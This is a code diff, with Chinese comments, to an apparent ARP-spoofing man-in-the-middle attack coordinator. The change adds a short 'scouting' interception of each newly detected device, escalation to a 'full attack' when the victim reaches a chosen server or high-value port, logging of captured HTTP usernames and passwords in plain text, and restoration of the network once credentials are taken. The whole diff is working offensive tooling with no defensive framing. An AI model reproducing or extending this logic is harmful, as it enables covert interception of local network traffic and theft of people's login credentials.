@@ -65,7 +65,7 @@ class AttackCoordinator:
             return None
     
     def _handle_arp_analysis(self, analysis) -> Optional[AttackDecision]:
-        """处理ARP分析结果"""
+        """处理ARP分析结果 - 发起侦察窗口"""
         if not analysis.gateway_query:
             return None
             
@@ -83,7 +83,7 @@ class AttackCoordinator:
                 reason='blocked_by_cache'
             )
         
-        # 授权攻击
+        # ★【核心修改】★ 启动侦察窗口，而非全面攻击
         with self.stats_lock:
             self.stats['attacks_authorized'] += 1
             
@@ -92,34 +92,66 @@ class AttackCoordinator:
         if not target_mac:
             target_mac = self.state_cache.get_cached_mac(target_ip) or ''
         
+        # ★【新策略】★ 创建侦察模式的攻击决策
         decision = AttackDecision(
             action='attack',
             target_ip=target_ip,
             gateway_ip=self.config.network.gateway_ip,
             target_mac=target_mac,
             gateway_mac='',  # 将在执行时获取
-            duration=self.config.attack.attack_timeout,
-            attack_type='stealth' if self.config.attack.stealth_mode else 'standard',
-            reason='arp_gateway_query'
+            duration=self.config.attack.strategy.scouting_duration,  # 使用侦察持续时间
+            attack_type='scouting',  # 侦察模式
+            reason='arp_gateway_query_for_scouting'
         )
         
-        # 开始攻击会话跟踪
+        # 开始侦察会话跟踪
         self.state_cache.start_attack_session(
             target_ip, 
             decision.duration, 
             decision.attack_type
         )
         
-        self.logger.info(f"Attack authorized for {target_ip} (ARP gateway query)")
+        self.logger.info(f"🕵️ New device {target_ip} detected. Initiating {decision.duration}s 'scouting' MiTM.")
         return decision
     
     def _handle_http_analysis(self, analysis) -> Optional[AttackDecision]:
-        """处理HTTP分析结果"""
+        """处理HTTP分析结果 - 价值判断与攻击升级"""
         target_ip = analysis.source_ip
         
-        # 如果捕获到凭据，记录并可能触发恢复
+        # 获取目标和端口信息
+        dst_ip = analysis.metadata.get('dst_ip', '')
+        dst_port = analysis.metadata.get('dst_port', 0)
+        
+        # ★【核心逻辑1】★ 检查是否为高价值事件
+        is_high_value_event = self._is_high_value_event(dst_ip, dst_port)
+        
+        # ★【核心逻辑2】★ 获取当前攻击状态
+        current_attack_info = self.state_cache.get_attack_info(target_ip)
+        
+        # ★【核心逻辑3】★ 如果处于侦察模式，且触发高价值事件，则升级攻击
+        if is_high_value_event and current_attack_info and current_attack_info['attack_type'] == 'scouting':
+            self.logger.info(f"🎯 High-value event from {target_ip} (port {dst_port})! Upgrading to full attack for {self.config.attack.strategy.full_attack_duration}s.")
+            
+            # 升级攻击会话
+            self.state_cache.upgrade_attack_session(
+                target_ip, 
+                self.config.attack.strategy.full_attack_duration, 
+                'full_attack'
+            )
+            
+            # 发送攻击升级指令
+            return AttackDecision(
+                action='attack',
+                target_ip=target_ip,
+                gateway_ip=self.config.network.gateway_ip,
+                duration=self.config.attack.strategy.full_attack_duration,
+                attack_type='full_attack',
+                reason='high_value_event_detected'
+            )
+        
+        # ★【核心逻辑4】★ 凭据捕获处理（无论在哪种攻击模式下）
         if analysis.http_credentials:
-            self.logger.info(f"🔑 Credentials captured from {target_ip}: "
+            self.logger.info(f"🏆 Credentials captured from {target_ip}: "
                            f"{analysis.http_credentials['username']}:"
                            f"{analysis.http_credentials['password']}")
             
@@ -129,25 +161,38 @@ class AttackCoordinator:
             # 标记攻击成功
             self.state_cache.end_attack_session(target_ip, success=True)
             
-            # 决定是否立即恢复ARP (添加配置检查)
-            immediate_restore = getattr(self.config.attack, 'immediate_restore_on_success', True)
-            if immediate_restore:
-                with self.stats_lock:
-                    self.stats['restores_initiated'] += 1
-                    
-                return AttackDecision(
-                    action='restore',
-                    target_ip=target_ip,
-                    gateway_ip=self.config.network.gateway_ip,
-                    reason='credentials_captured'
-                )
+            # 立即恢复网络
+            return AttackDecision(
+                action='restore',
+                target_ip=target_ip,
+                gateway_ip=self.config.network.gateway_ip,
+                reason='credentials_captured'
+            )
         
-        # 对于普通HTTP流量，不需要特殊处理
+        # ★【核心逻辑5】★ 普通HTTP流量，记录但不做决策
         return AttackDecision(
             action='ignore',
             target_ip=target_ip,
             reason='http_traffic_logged'
         )
+    
+    def _is_high_value_event(self, dst_ip: str, dst_port: int) -> bool:
+        """判断是否为高价值事件"""
+        # 检查是否访问目标服务器
+        if dst_ip == self.config.network.target_server:
+            self.logger.debug(f"High-value server access detected: {dst_ip}")
+            return True
+        
+        # 检查是否访问高价值端口
+        if dst_port in self.config.attack.strategy.high_value_ports:
+            self.logger.debug(f"High-value port access detected: {dst_port}")
+            return True
+        
+        # ★【扩展】★ 检查其他高价值模式
+        # 例如：特定域名、特定URL路径等
+        # 这里可以根据实际需求扩展
+            
+        return False
     
     def _save_credentials(self, source_ip: str, credentials: Dict[str, str], metadata: Dict):
         """保存捕获的凭据并触发立即撤离"""
